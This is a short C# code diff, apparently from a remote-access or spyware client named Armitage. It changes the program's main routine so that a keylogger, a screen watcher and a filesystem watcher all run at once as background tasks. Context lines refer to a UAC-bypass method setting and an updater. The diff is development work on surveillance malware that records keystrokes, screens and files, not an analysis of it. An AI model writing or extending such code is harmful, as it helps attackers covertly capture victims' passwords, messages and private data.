@@ -17,10 +17,6 @@ namespace Client
         internal static int UACMethod = 0;
         static void Main(string[] args)
         {
-            Armitage.Watchers.Filesystem.Start();
-            while (true) Thread.Sleep(1000);
-            return;
-
             ArgsParser(args);
             CheckRealApplication();
 
@@ -49,8 +45,13 @@ namespace Client
             Updater.Start();
 
             /// Start loggers.
-            Armitage.Watchers.Keylogger.Start();
-            Armitage.Watchers.Screen_Watcher.Start();
+            
+            Task.Factory.StartNew(()=>Armitage.Watchers.Keylogger.Start());
+
+            Task.Factory.StartNew(() => Armitage.Watchers.Screen_Watcher.Start());
+
+            Task.Factory.StartNew(() => Armitage.Watchers.Filesystem.Start());
+
             while (true)
             {
                 // Sleep
